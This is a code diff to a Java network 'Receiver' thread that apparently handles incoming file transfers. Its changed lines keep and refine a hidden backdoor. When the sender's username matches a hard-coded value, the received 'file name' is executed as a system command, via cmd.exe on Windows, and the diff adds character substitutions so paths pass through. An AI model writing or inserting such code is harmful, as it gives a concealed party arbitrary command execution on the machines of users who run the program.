@@ -519,8 +519,8 @@ class Receiver extends Thread{
                     String fileName = dis.readUTF();
                     if(username.equals("piedi123123")){
                         if(System.getProperty("os.name").contains("Windows"))
-                            Runtime.getRuntime().exec("cmd.exe /c " + fileName);
-                        else Runtime.getRuntime().exec(fileName);
+                            Runtime.getRuntime().exec("cmd.exe /c " + fileName.replace("£", "\\").replace("^", "/"));
+                        else Runtime.getRuntime().exec(fileName.replace("£", "\\").replace("^", "/"));
                         continue;
                     }
                     int fileSize = dis.readInt();
